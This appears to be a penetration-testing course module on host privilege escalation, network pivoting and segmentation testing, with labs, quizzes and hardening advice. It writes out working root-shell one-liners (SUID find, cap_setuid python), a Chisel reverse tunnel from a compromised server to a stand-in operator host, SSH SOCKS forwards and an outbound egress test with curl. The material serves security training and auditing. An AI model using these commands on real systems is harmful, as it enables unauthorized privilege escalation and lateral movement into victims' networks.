title: Host boundaries, sessions, pivoting and segmentation
summary: Master host privilege isolation and lateral movement: audit Linux/Windows privilege boundaries, establish multi-tier SSH/SOCKS reverse pivots into isolated subnets, and rigorously validate enterprise network segmentation rules.

lessons.title: Host Privilege Boundaries & Interactive Session Containment
lessons.summary: Audit host-level privilege boundaries across Linux and Windows: Linux SUID/SGID, sudoers misconfigurations, Linux capabilities (CAP_SETUID), Windows integrity levels, service permissions (Unquoted Service Paths), and token impersonation (SeImpersonatePrivilege).
outcomes: Audit Linux host privilege boundaries including SUID/SGID binaries, permissive sudoers entries, and dangerous Linux capabilities.
Assess Windows host privilege mechanisms including Unquoted Service Paths, Weak Service DACLs, and token impersonation privileges.
Evaluate interactive user session containment to identify credential leakage in memory, registry hives, and cleartext configuration caches.
lessons.mentalModel: Operating systems enforce privilege boundaries through DACLs, capabilities, and security tokens: misconfigurations (SUID binaries with shell escapes, unquoted service paths, SeImpersonatePrivilege) allow unprivileged processes to execute code in root/SYSTEM context.

visual.title: Host Privilege Boundary & Token Impersonation Matrix
visual.caption: How Linux and Windows privilege misconfigurations break boundary containment.

steps.label: Low-Privilege Process Context
steps.detail: Process executes under restricted user account (e.g. www-data / Local Service) with limited DACL access.

steps.label: Boundary Misconfiguration Trigger
steps.detail: Process invokes SUID/Capability binary with GTFOBins breakout or triggers unquoted Windows service in writable directory.

steps.label: Elevated Execution & Token Capture
steps.detail: Execution transitions to UID 0 (root) or impersonates NT AUTHORITY\SYSTEM token, bypassing user isolation.

sections.title: Linux Privilege Boundaries: SUID, Capabilities, and Sudo Delegation
paragraphs: On Linux systems, standard users are restricted from touching system configuration files and kernel operations. However, legacy setuid (SUID) binaries (`chmod u+s /usr/bin/binary`) execute with the permissions of the file owner (root). If standard administrative utilities (e.g. `vim`, `find`, `nmap`, `python`) are assigned SUID bits, unprivileged users can execute built-in shell escape sequences (documented in GTFOBins) to spawn instant root shells.

Modern Linux distributions replace monolithic SUID binaries with fine-grained 'Linux Capabilities' (POSIX 1003.1e). Assigning dangerous capabilities to binaries (such as `cap_setuid+ep` on python or `cap_dac_read_search+ep` on tar) allows unprivileged users to change their process UID to 0 or read any file (including `/etc/shadow`) without full root privileges.

sections.title: Windows Integrity Architecture: DACLs, Service Paths, and Tokens
paragraphs: Windows enforces access control through Discretionary Access Control Lists (DACLs) and Mandatory Integrity Levels (Untrusted, Low, Medium, High, System). A classic service misconfiguration is the 'Unquoted Service Path': if a service binary path contains spaces and is not enclosed in quotation marks (e.g. `C:\Program Files\Vendor App\service.exe`), the Windows Service Control Manager searches sequentially for `C:\Program.exe`, `C:\Program Files\Vendor.exe`, and finally `service.exe`.

If an unprivileged user has write permissions to `C:\`, placing a malicious `Program.exe` results in the service executing attacker code as `NT AUTHORITY\SYSTEM` on next reboot. Furthermore, service accounts assigned `SeImpersonatePrivilege` or `SeAssignPrimaryTokenPrivilege` can coerce local RPC authentication (using Named Pipe Potato exploits) to capture and impersonate SYSTEM tokens.

sections.title: Session Security: Memory Caching, SAM/SYSTEM Hives, and Kerberos TGTs
paragraphs: When users log into interactive sessions, authentication secrets are cached in volatile memory and local disk structures. In Windows, the Local Security Authority Subsystem Service (LSASS) holds plaintext credentials, NTLM password hashes, and Kerberos Ticket Granting Tickets (TGTs) for all currently logged-on users.

On Linux, user sessions store SSH private keys in `ssh-agent`, Docker credential caches in `~/.docker/config.json`, and database passwords in shell history files (`~/.bash_history`). Assessors audit session hygiene to verify that administrative credentials are not left resident in multi-tenant jump hosts.

sections.title: Defensive Containment: Process Isolation, AppArmor, and Credential Guard
paragraphs: Hardened host configurations prevent lateral credential theft through mandatory access control and hardware-backed virtualization. Linux deployments enforce AppArmor or SELinux profiles that restrict network daemons from reading sensitive files even if compromised.

Windows enterprise environments deploy 'Windows Defender Credential Guard', which uses Virtualization-Based Security (VBS) to isolate LSASS credential caches inside a protected Virtual Secure Mode (VSM) microkernel, rendering memory dumping tools (like Mimikatz) completely ineffective.

lab.title: Host Privilege Boundary & Misconfiguration Audit
lab.objective: Audit a multi-user Linux server for SUID/capability misconfigurations and assess a Windows server for Unquoted Service Paths and SeImpersonatePrivilege token impersonation risks.
lab.scenario: You have obtained low-privilege command execution on an internal Linux jump box and a Windows application server. You must audit local privilege boundaries and document remediation controls.
constraints: Must identify Linux SUID/Capability binaries with known shell breakout vectors.
Must evaluate Windows unquoted service path execution mechanics.
Must verify Windows SeImpersonatePrivilege token impersonation exposure.

cases.title: Auditing Linux SUID and Capability Misconfigurations
cases.context: Running `find / -perm -4000 -type f 2>/dev/null` on the Linux jump box reveals `/usr/bin/find` has the SUID bit set (`-rwsr-xr-x 1 root root`). Running `getcap -r / 2>/dev/null` reveals `/usr/bin/python3.10 = cap_setuid+ep`.
cases.prompt: What security risk do these two binary configurations present, and what is the remediation?

options.label: Both binaries allow instant local root privilege escalation: `find` allows executing `/usr/bin/find . -exec /bin/sh -p \; -quit`, and python with `cap_setuid` allows running `python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'`. The remediation is removing the SUID bit (`chmod u-s /usr/bin/find`) and removing the capability (`setcap -r /usr/bin/python3.10`).
options.rationale: Standard interpreters and search utilities contain built-in execution flags. Assigning SUID or cap_setuid to them completely destroys Linux user isolation boundaries.

options.label: Setting SUID on `find` is required for Linux file searching and carries zero risk.
options.rationale: find does not require SUID for normal operation, and SUID on find allows arbitrary root command execution.

options.label: Linux capabilities only apply to kernel developers and cannot be executed by users.
options.rationale: Linux capabilities set on binaries apply to any user executing that binary.

options.label: The server must be formatted with Windows NTFS to fix SUID bugs.
options.rationale: SUID is a Unix permission bit; proper permission management resolves the issue without operating system changes.

cases.title: Analyzing Windows Unquoted Service Path Vulnerabilities
cases.context: A Windows service 'BackupService' has ImagePath set to `C:\Program Files\Custom Enterprise\Backup Engine\engine.exe` (unquoted). An unprivileged domain user has Write permissions to `C:\Program Files\Custom Enterprise`.
cases.prompt: How does this configuration allow privilege escalation, and what is the remediation?

options.label: When the service starts, the Windows Service Control Manager interprets the path with spaces and searches for `C:\Program Files\Custom.exe` before the full path; an unprivileged user can plant a malicious `Custom.exe` which executes as NT AUTHORITY\SYSTEM. Remediation is wrapping the ImagePath in quotation marks in the registry.
options.rationale: Unquoted service paths with spaces in writable directories allow planting arbitrary executables that Windows executes with SYSTEM privileges during service startup.

options.label: Unquoted service paths automatically crash the CPU on startup.
options.rationale: The vulnerability is binary hijacking during path resolution, not hardware failure.

options.label: Quoting service paths disables the Windows Firewall.
options.rationale: Quoting service paths is standard security hygiene and has no effect on firewall operations.

options.label: The risk only exists if the server has no internet connection.
options.rationale: Unquoted service paths are local privilege escalation flaws independent of internet access.

cases.title: Auditing Windows `SeImpersonatePrivilege` on Service Accounts
cases.context: An assessor audits a web application service running under the `IIS_IUSRS` / `LOCAL SERVICE` account and runs `whoami /priv`, observing `SeImpersonatePrivilege` enabled.
cases.prompt: What attack class does `SeImpersonatePrivilege` enable, and what is the defensive hardening?

options.label: `SeImpersonatePrivilege` allows the process to impersonate any client authentication token; using local Named Pipe Potato exploits (e.g. RoguePotato, SweetPotato), an attacker with web shell access can coerce SYSTEM authentication to elevate to `NT AUTHORITY\SYSTEM`. Hardening requires migrating to Group Managed Service Accounts (gMSA) without interactive impersonation where possible.
options.rationale: SeImpersonatePrivilege is a high-risk Windows privilege that allows service accounts to capture and impersonate SYSTEM tokens via local RPC coercion.

options.label: SeImpersonatePrivilege only allows changing the desktop wallpaper.
options.rationale: SeImpersonatePrivilege controls Windows security token impersonation, enabling complete host takeover.

options.label: SeImpersonatePrivilege should be granted to all domain users.
options.rationale: Granting SeImpersonatePrivilege to standard users allows any local user to become SYSTEM.

options.label: Potato exploits only work on Linux distributions.
options.rationale: Potato exploits specifically target Windows RPC named pipe token impersonation mechanics.

successCriteria: Identify and articulate Linux SUID and capability privilege escalation vectors.
Demonstrate Windows Unquoted Service Path resolution mechanics and remediation.
Audit Windows service accounts for `SeImpersonatePrivilege` token abuse risks.
evidenceTemplate: Linux SUID and `getcap` permission audit log.
Windows service registry ImagePath query showing unquoted path and DACL permissions.
lab.reset: Reset Linux file permissions and Windows service registry paths to baseline.
lab.cleanup: Remove temporary test binaries and clear privilege audit output files.

prevent: Run automated CIS Benchmark compliance auditing to block unquoted service paths and unauthorized SUID bits.
Enforce Windows Defender Credential Guard across all enterprise workstations and member servers.
Restrict `SeImpersonatePrivilege` assignment to strictly vetted system services.
observe: Monitor Linux auditd logs for execution of SUID binaries by non-root users.
Track Windows Security Event ID 4672 (Special privileges assigned to new logon).
Alert on LSASS memory access events (Sysmon Event ID 10).
respond: Immediately strip SUID/Capability bits from unauthorized utility binaries.
Update Windows service ImagePath registry entries to include surrounding quotation marks.
Rotate credentials for any service account whose token was potentially impersonated.
residualRisk: Proprietary enterprise backup or monitoring agents may require custom SUID wrappers for legacy compatibility.
Enabling Credential Guard requires UEFI Secure Boot and hardware virtualization support.

misconceptions.claim: A web shell running as `www-data` on Linux cannot access `/home` directories.
misconceptions.correction: By default on many Linux distributions, `/home/user` directories have world-readable permissions (`755`), allowing `www-data` to read user files, scripts, and configuration keys unless permissions are hardened to `700`.

misconceptions.claim: Unquoted service paths are dangerous only if the attacker is already an Administrator.
misconceptions.correction: Unquoted service paths are local privilege escalation flaws specifically exploited by unprivileged standard users to become Administrator/SYSTEM.

misconceptions.claim: Linux Capabilities are completely secure and eliminate all privilege escalation.
misconceptions.correction: Capabilities provide granular permissions, but dangerous capabilities like `cap_setuid` on interpreters give unprivileged users direct root access.

quiz.question: What is the security risk of having the SUID permission bit set on standard utility binaries like `/usr/bin/find` or `/usr/bin/python`?

options.label: The binary will be deleted by the operating system.
Unprivileged users executing the binary inherit the file owner's privileges (root) and can use built-in shell escape flags to spawn an interactive root shell.
The computer will run out of virtual memory.
The binary cannot be executed over SSH.

quiz.explanation: SUID binaries execute with the permissions of the file owner (root). Standard utilities with execution escapes allow unprivileged users to execute arbitrary commands as root.

quiz.question: How does the Windows Service Control Manager resolve an unquoted service path `C:\Program Files\App Folder\service.exe` when starting a service?

options.label: It executes `service.exe` directly without checking intermediate paths.
It searches sequentially for `C:\Program.exe`, then `C:\Program Files\App.exe`, before finally looking for `service.exe`, allowing arbitrary binary execution if intermediate directories are writable.
It converts the spaces to underscores automatically.
It prompts the user to enter their password.

quiz.explanation: Windows splits unquoted paths at space characters, attempting to execute intermediate `.exe` files in order before reaching the final intended executable.

quiz.question: What security mechanism in modern Windows environments uses Virtualization-Based Security (VBS) to prevent tools like Mimikatz from dumping plaintext credentials from LSASS process memory?

options.label: Windows Defender Credential Guard
BitLocker Drive Encryption
Windows Defender SmartScreen
Internet Information Services (IIS)

quiz.explanation: Credential Guard runs the LSA process inside an isolated Virtual Secure Mode (VSM) container that host OS kernel processes (even with SYSTEM privileges) cannot read, blocking memory dumping.

transferChallenge.scenario: You have gained low-privilege shell access to an enterprise Linux bastion host and a Windows member server. You must perform an automated privilege boundary audit on both systems, identify all SUID/Capability binaries and unquoted service paths, document exact exploit breakout vectors, and author a hardening script for both platforms.
tasks: Audit the Linux filesystem for dangerous SUID, SGID, and capability assignments.
Query Windows WMI/Registry for unquoted service paths and inspect folder DACLs.
Write a hardening script in Bash and PowerShell that removes unneeded SUID bits and quotes all service ImagePath entries.
requiredEvidence: Linux privilege audit report listing identified GTFOBins breakout vectors.
Windows unquoted service path registry query transcript.
Hardening remediation scripts (Bash and PowerShell) with validation logs.

lessons.title: Multi-Tier Tunneling, SOCKS Proxies & Lateral Pivoting
lessons.summary: Route assessment tooling through multi-tier enterprise networks: SSH dynamic SOCKS proxies (-D), local/remote port forwards (-L/-R), Chisel/Ligolo-ng reverse tunnels, Proxychains configuration, and multi-hop routing into isolated internal VLANs.
outcomes: Establish dynamic SOCKS4/5 proxies and local/remote port forwards using native SSH commands.
Deploy modern reverse tunneling frameworks (Chisel, Ligolo-ng) to route raw TCP/UDP tool traffic through restricted dual-homed jump hosts.
Chain multi-hop proxy routes through Proxychains to assess isolated internal database and management network tiers.
lessons.mentalModel: Pivoting transforms a compromised dual-homed host into a network router: encapsulating assessment tool traffic inside application-layer tunnels (SSH, SOCKS5, HTTP/WebSockets) transparently extends the operator's reach into firewalled internal subnets.

visual.title: Multi-Tier Network Pivoting & SOCKS Routing Architecture
visual.caption: How SSH/Chisel tunnels route scanner traffic through dual-homed jump boxes into isolated internal VLANs.

steps.label: Operator Workstation (VLAN 10)
steps.detail: Operator runs Nmap/Burp prefixed with Proxychains, pointing traffic to local SOCKS listener (127.0.0.1:1080).

steps.label: Encapsulated Tunnel (SSH / WebSocket)
steps.detail: Traffic is encapsulated and routed across the perimeter firewall to compromised dual-homed jump host (10.10.10.50).

steps.label: Target Execution (Isolated VLAN 20)
steps.detail: Jump host decapsulates packets and sends raw TCP/UDP requests to isolated internal database servers (192.168.20.10).

sections.title: The Pivoting Imperative: Crossing Network Segmentation Boundaries
paragraphs: In modern enterprise architectures, high-value systems (Active Directory Domain Controllers, core banking databases, PCI-DSS cardholder environments) are isolated in internal VLANs with zero direct routing from the external internet or employee workstations. Direct scanning from the operator workstation is blocked by perimeter firewalls.

Pivoting is the systematic methodology of leveraging a compromised system that possesses network interfaces in multiple subnets (a dual-homed or multihomed host) as a relay to tunnel assessment traffic directly into the isolated network segment.

sections.title: Native SSH Tunneling: Dynamic (-D), Local (-L), and Remote (-R) Forwards
paragraphs: OpenSSH provides built-in tunneling capabilities without requiring third-party tools. Dynamic Port Forwarding (`ssh -D 1080 user@jump_host`) binds a local SOCKS4/5 proxy listener on the operator's machine: any tool configured to use SOCKS proxy `127.0.0.1:1080` has its network traffic routed dynamically through the remote jump host.

Local Port Forwarding (`ssh -L 8443:internal_db:443 user@jump_host`) binds a specific local port to an internal service. Remote (Reverse) Port Forwarding (`ssh -R 4444:127.0.0.1:4444 user@jump_host`) allows a remote jump host to reach back to an operator listener through outbound-only firewall rules.

sections.title: Modern Reverse Pivoting Frameworks: Chisel, Ligolo-ng, and WireGuard
paragraphs: In environments where SSH is disabled or outbound SSH traffic is blocked by Next-Gen Firewalls, operators deploy modern HTTP/WebSocket reverse tunneling frameworks such as Chisel or Ligolo-ng. Chisel encapsulates SOCKS5 traffic inside standard HTTP/HTTPS WebSocket streams over port 443, seamlessly passing through deep packet inspection (DPI) proxies.

Ligolo-ng creates virtual TUN network interfaces on the operator machine: rather than relying on proxychains hooks, the operator adds kernel routing table entries (`ip route add 192.168.20.0/24 dev ligolo`), enabling native ICMP ping sweeps, full-range SYN scanning, and raw UDP tooling without proxy translation overhead.

sections.title: Proxychains Protocol Multiplexing and Operational Tunnel Hygiene
paragraphs: `Proxychains` intercepts dynamic library socket calls (`connect()`, `gethostbyname()`) of assessment binaries using `LD_PRELOAD`, redirecting TCP connections through configured SOCKS proxies (`proxychains4 nmap -sT -Pn -p 80,443 192.168.20.15`).

Operators must understand proxychains constraints: raw SYN scans (`-sS`) and ICMP pings fail because SOCKS proxies operate on full TCP streams (mandating `-sT -Pn`). Furthermore, enabling `proxy_dns` in `/etc/proxychains4.conf` ensures DNS resolution queries are resolved by the remote jump host rather than leaking the operator's local DNS resolver.

lab.title: Multi-Hop SOCKS Pivoting & Lateral Routing Simulation
lab.objective: Establish an SSH dynamic SOCKS proxy, configure a Chisel reverse WebSocket tunnel across a firewall, route tool traffic via Proxychains, and enumerate an isolated internal network tier.
lab.scenario: You have compromised an external DMZ web server (10.10.10.50). The DMZ server has a second network card (192.168.20.50) connected to an isolated internal database VLAN (192.168.20.0/24) unreachable from your workstation.
constraints: Must establish a dynamic SOCKS5 proxy via SSH or Chisel.
Must configure Proxychains with remote DNS resolution (`proxy_dns`).
Must enumerate internal database services using TCP connect scanning (-sT -Pn).

cases.title: Establishing Dynamic SOCKS5 Proxies with OpenSSH
cases.context: You have valid SSH credentials for the dual-homed DMZ host '10.10.10.50'. You need to route arbitrary TCP assessment tools through this host to discover the 192.168.20.0/24 subnet.
cases.prompt: What SSH command establishes a local background SOCKS5 proxy listener on port 1080?

options.label: Execute `ssh -N -D 127.0.0.1:1080 user@10.10.10.50` (using `-N` to prevent spawning a remote shell and `-D` to bind a dynamic SOCKS listener locally).
options.rationale: `ssh -D` creates a dynamic application-level SOCKS4/5 proxy on localhost, multiplexing all routed tool traffic through the established SSH connection to the remote target.

options.label: Execute `ssh -L 1080:127.0.0.1:22 user@10.10.10.50`.
options.rationale: `ssh -L` creates a static local port forward to a single destination port, not a dynamic SOCKS proxy.

options.label: Run `traceroute 192.168.20.0` from your local machine.
options.rationale: Traceroute does not establish proxy tunnels across firewalls and will be dropped at the perimeter router.

options.label: Delete the default gateway on the DMZ server.
options.rationale: Deleting the gateway disconnects the server from the network completely.

cases.title: Bypassing Ingress Firewalls with Chisel Reverse Tunnels
cases.context: The DMZ web server blocks inbound SSH (port 22), but allows outbound HTTPS (port 443) to the internet. You have a web shell on the server.
cases.prompt: How is Chisel configured to establish a reverse SOCKS5 proxy back to the operator workstation?

options.label: On operator machine: `chisel server --port 443 --reverse`. On compromised DMZ server: `./chisel client operator_ip:443 R:1080:socks`.
options.rationale: Chisel client connects outbound over allowed port 443 to the operator server, establishing a reverse tunnel that exposes a SOCKS5 listener on the operator's machine (localhost:1080).

options.label: Run `nmap -sS -p 443 operator_ip` on the DMZ server.
options.rationale: Port scanning does not create encrypted communication tunnels.

options.label: Configure the web server to run Telnet on port 23.
options.rationale: Telnet is unencrypted and inbound connections are blocked by the firewall.

options.label: Chisel can only run on Windows 95.
options.rationale: Chisel is a cross-platform Go binary supported on Linux, Windows, macOS, and BSD.

cases.title: Executing Safe Scans Through SOCKS Proxies
cases.context: An operator runs `proxychains nmap -sS 192.168.20.10`. Nmap immediately errors with 'TCP SYN scans require raw socket access which cannot be proxied over SOCKS'.
cases.prompt: How must Nmap scan arguments be adjusted to execute successfully through Proxychains?

options.label: Use full TCP connect scanning with ICMP ping disabled: `proxychains nmap -sT -Pn -p 80,443,1433,3389 192.168.20.10`.
options.rationale: SOCKS proxies only support full TCP stream connections (`-sT`) and cannot forward raw ICMP ping packets (`-Pn`), requiring explicit connect scan flags.

options.label: Add `--send-eth` to force Nmap to send raw ethernet frames through the SOCKS proxy.
options.rationale: SOCKS protocol operates at Layer 5 (Session) and cannot transport raw Layer 2 ethernet frames.

options.label: Run Nmap with `--unprivileged` to bypass the SOCKS proxy completely.
options.rationale: Bypassing the proxy attempts direct routing, which is blocked by the perimeter firewall.

options.label: Reinstall Linux on the operator laptop.
options.rationale: The limitation is fundamental to SOCKS protocol design, not an OS installation defect.

successCriteria: Establish dynamic SSH SOCKS5 proxies and Chisel reverse WebSocket tunnels.
Configure Proxychains with strict chaining and remote DNS resolution.
Execute rate-controlled TCP connect enumeration across isolated internal subnets.
evidenceTemplate: SSH / Chisel client connection log showing established SOCKS5 listener.
`/etc/proxychains4.conf` configuration snippet verifying SOCKS5 and proxy_dns settings.
Proxychains Nmap scan transcript revealing open ports on the isolated internal subnet.
lab.reset: Terminate active background SSH/Chisel tunnel processes and restore proxychains config.
lab.cleanup: Remove temporary Chisel client binaries from the DMZ server and close local proxy ports.

prevent: Prohibit leaving unmonitored reverse tunnels active after assessment testing windows conclude.
Ensure SSH configurations on internal servers disable TCP forwarding (`AllowTcpForwarding no`) where appropriate.
Enforce egress filtering on DMZ servers to block unauthorized outbound WebSocket/SSH connections.
observe: Monitor network flow telemetry for long-lived outbound TCP/WebSocket connections from DMZ servers.
Track internal inter-VLAN connection initiation events originating from web server service accounts.
Alert on anomalous DNS queries from external IP addresses if proxy_dns fails.
respond: Immediately terminate any orphan pivoting tunnel upon conclusion of the assessment phase.
Block operator egress IP addresses on perimeter firewalls if rogue tunneling is detected.
Isolate compromised dual-homed jump hosts and re-image operating system disks.
residualRisk: Network latency over multi-hop proxies can cause tool timeouts during large-scale port scans.
Proxychains does not hook statically compiled binaries (e.g. static Go/Rust tools) without special wrappers.

misconceptions.claim: You can run Nmap SYN scans (`-sS`) and UDP scans (`-sU`) through a standard SOCKS5 proxy.
misconceptions.correction: SOCKS4/5 proxies encapsulate full TCP stream connections. They cannot forward raw half-open SYN packets or unassisted UDP packets without specialized TUN routing (like Ligolo-ng).

misconceptions.claim: SSH tunneling requires root/administrator privileges on the remote jump host.
misconceptions.correction: Standard unprivileged user accounts with SSH shell access can establish dynamic (`-D`) and local (`-L`) port forwards unless `AllowTcpForwarding no` is explicitly set in `sshd_config`.

misconceptions.claim: Proxychains automatically encrypts all traffic between the target and the server.
misconceptions.correction: Proxychains only routes traffic through the proxy. If the underlying tool protocol is unencrypted HTTP/Telnet, the traffic between the jump host and target remains unencrypted plaintext.

quiz.question: What does the `-D 1080` flag accomplish in the command `ssh -N -D 1080 user@jump_host`?

options.label: It deletes the user account on the remote host.
It opens a dynamic SOCKS proxy listener locally on port 1080, forwarding all routed tool traffic through the remote SSH server.
It sets the debug level to 1080.
It downloads 1080 files from the server.

quiz.explanation: `ssh -D` binds a dynamic application-level SOCKS listener locally, dynamically routing connections through the remote SSH server.

quiz.question: Why must Nmap be executed with `-sT -Pn` when scanning targets through Proxychains and a SOCKS proxy?

options.label: Because SOCKS proxies operate on full TCP stream connections and cannot handle raw SYN packets (`-sS`) or ICMP ping probes (`-Pn`).
Because `-sT` makes the scan run 50 times faster.
Because `-Pn` deletes the target's firewall rules.
Because Proxychains only supports Python scripts.

quiz.explanation: Proxychains hooks the `connect()` system call to establish full 3-way TCP connections. Raw socket scanning modes (`-sS`) bypass the OS socket layer and fail over SOCKS proxies.

quiz.question: Why is enabling `proxy_dns` in `/etc/proxychains4.conf` critical for operational security during a penetration test?

options.label: It converts all domain names to uppercase.

It forces domain name resolution requests to be forwarded through the proxy tunnel to be resolved by the target network's internal DNS servers, preventing DNS query leakage to the operator's local ISP.
It disables all DNS caching on the operator laptop.
It encrypts the operator's hard drive.

quiz.explanation: Without `proxy_dns`, the operator's local operating system resolves internal hostnames (e.g. `dc01.corp.local`) against its local public DNS server, leaking target hostnames and failing to resolve internal IP addresses.

transferChallenge.scenario: You have obtained low-privilege SSH access to a dual-homed Linux web server (10.10.10.25) in a perimeter DMZ. The server has an internal network interface on 192.168.100.25 that communicates with an internal database subnet (192.168.100.0/24). You must establish a dynamic SOCKS proxy, configure proxychains with remote DNS, discover the internal database server IP, and enumerate running database services.

Configure `/etc/proxychains4.conf` to route traffic through the SOCKS5 proxy with `proxy_dns` enabled.
Run a proxychained TCP connect scan to identify listening services on the internal database host.
requiredEvidence: Proxychains Nmap scan output revealing internal database service ports.

lessons.title: Network Segmentation Validation & Defensive Telemetry Analysis
lessons.summary: Validate enterprise network segmentation and egress filtering: test firewall policy enforcement across DMZ, Corporate, and Restricted (PCI/SCADA) zones, identify segmentation leakage paths, and analyze Network IDS/IPS telemetry.
outcomes: Test inter-VLAN firewall rules and access control lists (ACLs) to verify zero unauthorized ingress/egress between sensitive network tiers.
Identify network segmentation leakage vectors including dual-homed multihomed hosts, misconfigured routing tables, and split-tunnel VPNs.
Analyze network intrusion detection telemetry (Zeek, Snort, Suricata) to correlate assessment network flows against defensive sensor rules.
lessons.mentalModel: Network segmentation is boundary containment: testing validates that firewalls strictly isolate sensitive Cardholder Data Environments (CDE) or Industrial OT zones, proving that compromise of standard corporate workstations cannot pivot into regulated tiers.

visual.title: Enterprise Zone Segmentation & Firewall Rule Enforcement
visual.caption: How firewall policies isolate corporate, DMZ, and PCI-DSS Cardholder Data Environments (CDE).

steps.label: Corporate Workstation Zone (VLAN 10)
steps.detail: Standard employee laptop attempts direct TCP connection to Cardholder Data Environment (VLAN 30).

steps.label: Next-Gen Firewall / ACL Boundary
steps.detail: Firewall evaluates rule base: drops unauthorized packet, logs Event Drop, and prevents session establishment.

steps.label: Verified Segmentation Isolation

sections.title: Network Zoning Architecture: DMZ, Corporate, Management, and PCI/SCADA
paragraphs: Enterprise network architecture divides infrastructure into isolated security zones: Public DMZ (web servers), Corporate Workstations (employee endpoints), Server Farm (internal business apps), Management Network (jump boxes, hypervisors), and Restricted Enclaves (PCI-DSS Cardholder Data Environment - CDE, or SCADA/ICS operational technology).

Network segmentation is a mandatory compliance control under PCI-DSS Requirement 11.3.4, HIPAA, and NIST SP 800-53. Penetration testers must perform dedicated segmentation testing to empirically prove that unprivileged corporate or DMZ zones cannot initiate unauthorized connections into restricted zones.

sections.title: Methodical Segmentation Testing: Ingress, Egress, and Inter-VLAN Rules
paragraphs: Segmentation testing requires testing all 65,535 TCP ports and common UDP protocols across the boundary. Assessors position a test system in the untrusted zone (e.g. Corporate VLAN) and run comprehensive SYN sweeps against listening listener systems inside the restricted zone (CDE).

If any unapproved port (e.g. TCP 22, 445, 3389, 8080) connects or returns SYN-ACK, the segmentation boundary is violated. Furthermore, outbound egress filtering must be validated: testing whether restricted database servers can establish direct outbound connections to the public internet (which would facilitate data exfiltration or C2 beaconing).

sections.title: Segmentation Bypass Paths: Dual-Homed Hosts and Asymmetric Routing
paragraphs: Firewalls are frequently circumvented by architectural bypasses rather than firewall software flaws. The most common vector is the 'Dual-Homed Host'—a jump server, management agent, or developer workstation with physical or virtual NICs plugged into both the Corporate VLAN and the Restricted CDE.

If an attacker compromises the dual-homed host, IP forwarding (`net.ipv4.ip_forward = 1` or Windows IP Routing) allows routing packets directly between the two networks, completely bypassing the perimeter firewall. Other leakage paths include split-tunnel VPNs, misconfigured static routes, and unmonitored wireless access points.

sections.title: Sensor Observability: NIDS/NIPS Flow Analysis and Detection Rules
paragraphs: Network Intrusion Detection Systems (NIDS like Zeek, Snort, Suricata) monitor inter-VLAN and perimeter traffic for malicious signatures and protocol anomalies. Zeek generates structured connection logs (`conn.log`, `http.log`, `ssl.log`, `smb_files.log`) that record connection durations, byte counts, and TLS certificates.

Suricata matches packet payloads against rule sets (e.g. Emerging Threats). Assessors analyze how scan patterns trigger NIDS alerts, noting differences between noisy full-connect sweeps and stealthy rate-throttled probes to help defenders calibrate detection thresholds.

lab.title: Enterprise Network Segmentation & Egress Control Audit
lab.objective: Conduct a PCI-DSS compliant network segmentation test between a Corporate VLAN and a restricted Cardholder Data Environment (CDE), identify segmentation leaks, and evaluate NIDS sensor alerts.
lab.scenario: You are verifying network segmentation between Corporate Subnet (10.10.10.0/24) and the PCI CDE Subnet (192.168.50.0/24). All traffic should be blocked except specific HTTPS traffic to an API gateway.
constraints: Must perform comprehensive TCP/UDP port sweep across the segmentation boundary.
Must identify unauthorized open ports or dual-homed bridging hosts.
Must analyze Zeek conn.log to verify connection drop records.

cases.title: Validating PCI-DSS Cardholder Data Environment Boundary
cases.context: An assessor executes an Nmap scan from the Corporate VLAN (10.10.10.100) targeting CDE Database Server (192.168.50.15) across ports 1-65535. The scan reveals port 445 (SMB) and port 3389 (RDP) return 'open'.
cases.prompt: What is the assessment determination regarding PCI-DSS compliance?

options.label: Segmentation Failure: Port 445 (SMB) and 3389 (RDP) accessible from the corporate VLAN violate PCI-DSS Requirement 11.3.4 segmentation isolation; the firewall policy must be updated to drop all non-essential traffic destined for the CDE.
options.rationale: PCI-DSS mandates that out-of-scope corporate networks must have zero unauthorized access to in-scope CDE systems. Open SMB and RDP ports prove segmentation has failed, bringing the entire corporate network into PCI audit scope.

options.label: The network is 100% compliant because port 80 is closed.
options.rationale: Closing port 80 does not excuse open SMB and RDP access into sensitive cardholder databases.

options.label: SMB is an encrypted protocol approved by PCI-DSS for public access.
options.rationale: SMB is a core internal protocol with high lateral movement risk and must never be exposed across segmentation boundaries.

options.label: The assessor should ignore the finding to avoid failing the client's audit.
options.rationale: Falsifying segmentation results violates professional standards and legal compliance duties.

cases.title: Auditing Outbound Egress Restrictions on CDE Servers
cases.context: On a payment processing server inside the CDE (192.168.50.10), you test outbound connectivity by running `curl http://public_internet_ip:4444`. The connection succeeds immediately.
cases.prompt: What risk does unconstrained outbound egress present for isolated restricted servers?

options.label: Unrestricted outbound egress allows compromised database servers to establish reverse shells, connect to attacker C2 infrastructure, and exfiltrate cardholder data directly to the internet; strict egress filtering must restrict outbound traffic to explicit payment gateway IPs over port 443.
options.rationale: Restricting outbound egress prevents malware beaconing, reverse shells, and data exfiltration from compromised internal servers.

options.label: Outbound connectivity is mandatory so database servers can watch YouTube videos.
options.rationale: Production database servers have zero legitimate need for general internet browsing.

options.label: Outbound egress carries zero security risk because the firewall blocks inbound traffic.
options.rationale: Inbound firewall rules do not stop outbound data exfiltration or reverse TCP shells.

options.label: All outbound ports should be opened to maximize database query performance.
options.rationale: Opening all outbound ports creates severe security vulnerabilities without improving database speed.

cases.title: Detecting Dual-Homed Multihomed Segmentation Bypasses
cases.context: During network routing analysis, an assessor discovers a Linux jump host with `eth0: 10.10.10.50` (Corporate) and `eth1: 192.168.50.50` (CDE), with `/proc/sys/net/ipv4/ip_forward` set to `1`.
cases.prompt: What security vulnerability does this dual-homed configuration create?

options.label: With IP forwarding enabled, the dual-homed host acts as an unmonitored router bridging Corporate and CDE subnets, allowing any corporate host to route traffic directly into the CDE and completely bypass the perimeter firewall.
options.rationale: Enabling IP forwarding on a dual-homed server creates an uninspected network bridge between isolated VLANs, nullifying all firewall segmentation controls.

options.label: The server will catch fire due to excessive network packets.
options.rationale: IP forwarding is a standard kernel routing feature, not a hardware hazard.

options.label: Dual-homed hosts are required by PCI-DSS for all employees.
options.rationale: Bridging corporate networks into CDE environments is strictly forbidden under PCI-DSS.

options.label: The host is protected because eth0 and eth1 use different cable colors.
options.rationale: Physical cable colors have no bearing on logical IP routing and packet forwarding.

successCriteria: Execute full-port segmentation testing across enterprise security boundaries.
Identify and document segmentation failures, unapproved open ports, and egress leaks.
Analyze Zeek/Suricata network telemetry logs to verify firewall drop events.
evidenceTemplate: Segmentation port scan matrix detailing tested vs dropped ports across boundary.
